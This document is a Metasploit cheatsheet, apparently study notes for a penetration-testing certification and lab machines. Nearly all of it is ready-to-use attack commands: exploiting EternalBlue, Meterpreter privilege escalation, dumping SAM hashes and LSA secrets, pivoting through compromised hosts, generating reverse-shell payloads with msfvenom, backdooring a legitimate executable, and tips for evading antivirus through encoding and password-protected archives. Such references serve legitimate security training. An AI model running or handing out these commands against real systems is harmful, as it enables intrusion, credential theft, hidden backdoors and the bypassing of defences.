---
title: "Metasploit Cheatsheet"
type: cheatsheet
tags: [cheatsheet, exploitation, htb, linux, network, post-exploitation, web]
date_created: 2026-05-08
date_updated: 2026-05-08
sources: [cpts-metasploit]
---

## Setup

```bash
sudo systemctl start postgresql && sudo msfdb init
msfconsole -q
msf6 > db_status                   # verify DB connection
```

## Search and Selection

```bash
search ms17_010                    # keyword
search type:exploit platform:windows cve:2021 rank:excellent microsoft
search eternalblue type:exploit
use 0                              # by index from last search
use exploit/windows/smb/ms17_010_psexec
info                               # module description + CVE refs
show options
show targets                       # OS version variants
show payloads                      # compatible payloads
show encoders                      # compatible encoders
grep meterpreter grep reverse_tcp show payloads  # chained grep
```

## Options and Running

```bash
set RHOSTS 10.10.10.40
set LHOST tun0
set LPORT 4444
setg RHOSTS 10.10.10.40            # global, persists across modules
set target 6                       # pick specific target OS
set payload windows/x64/meterpreter/reverse_tcp
check                              # non-destructive exploitability test
run / exploit                      # execute
exploit -j                         # run as background job
```

## Sessions and Jobs

```bash
sessions                           # list active sessions
sessions -i 1                      # interact with session 1
background  /  Ctrl+Z              # background current session
jobs -l                            # list jobs
jobs -k 0                          # kill job 0
jobs -K                            # kill all jobs
```

## Meterpreter — Recon and Info

```bash
sysinfo                            # OS, hostname, architecture
getuid                             # current user (Server username: ...)
ps                                 # process list with PIDs and users
ipconfig                           # network interfaces
arp                                # ARP table
route                              # routing table
```

## Meterpreter — Privilege Escalation

```bash
getsystem                          # auto privesc attempts
steal_token <PID>                  # impersonate token from PID
migrate <PID>                      # inject into another process
shell                              # drop to OS shell
```

## Meterpreter — Credential Dumping

```bash
hashdump                           # dump SAM hashes (needs SYSTEM)
lsa_dump_sam                       # LSA dump of SAM
lsa_dump_secrets                   # LSA secrets (service accounts, etc.)
```

## Meterpreter — File System

```bash
pwd / ls / cd <dir>
upload /local/file.exe C:\\Windows\\Temp\\file.exe
download C:\\Users\\Admin\\flag.txt /tmp/flag.txt
search -f *.txt -d C:\\Users       # search for files
```

## Meterpreter — Networking / Pivoting

```bash
portfwd add -l 3389 -p 3389 -r 172.16.1.10   # forward local 3389 → remote
portfwd list
run post/multi/manage/autoroute    # add routes through session
```

## Post-Exploitation Modules

```bash
use post/multi/recon/local_exploit_suggester
set SESSION 1 && run               # find local privesc opportunities

use post/windows/gather/hashdump
use post/linux/gather/hashdump
use post/multi/gather/env          # environment variables
use post/windows/manage/migrate    # auto migrate to stable process
use post/multi/manage/shell_to_meterpreter   # upgrade shell to meterpreter
```

## Database

```bash
db_nmap -sV -p- 10.10.10.15       # nmap + save to DB
db_import Target.xml               # import Nmap XML
hosts                              # all discovered hosts
services                           # all discovered services
creds                              # stored credentials
loot                               # stored hash dumps, files
db_export -f xml backup.xml
workspace -a Lab1                  # new workspace
workspace Lab1                     # switch workspace
```

## MSFVenom — Payload Generation

```bash
# Windows — EXE (x64 Meterpreter reverse TCP)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe

# Windows — ASPX (IIS upload)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > shell.aspx

# Linux — ELF
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf > shell.elf

# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw > shell.php

# Python reverse shell
msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.5 LPORT=4444 -f raw > shell.py

# Encode (x86 only) with SGN, 10 iterations
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe

# Backdoor a legitimate binary
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -x /path/to/legit.exe -k -f exe -o backdoor.exe

# List formats / payloads / encoders
msfvenom --list formats
msfvenom -l payloads | grep linux
msfvenom -l encoders
```

## Payload Types Quick Reference

| Type | Example | Notes |
|---|---|---|
| Stageless | `windows/shell_bind_tcp` | Single file, larger, more reliable |
| Staged | `windows/shell/bind_tcp` | Stager fetches stage; smaller initial |
| Meterpreter | `windows/x64/meterpreter/reverse_tcp` | Staged, in-memory, AES encrypted |
| PowerShell | `windows/x64/powershell/reverse_tcp` | PS session |

## Evasion Quick Tips

```bash
# Multiple encoding iterations
msfvenom ... -e x86/shikata_ga_nai -i 10 ...

# Embed in legit exe and keep original execution
msfvenom ... -x legit.exe -k ...

# Archive trick (2× password-protected, remove extension)
rar a payload.rar -p payload.js && mv payload.rar payload
rar a payload2.rar -p payload && mv payload2.rar payload2

# Proxy MSF traffic through Burp
set PROXIES HTTP:127.0.0.1:8080
```

See [[metasploit]] for full tool page.
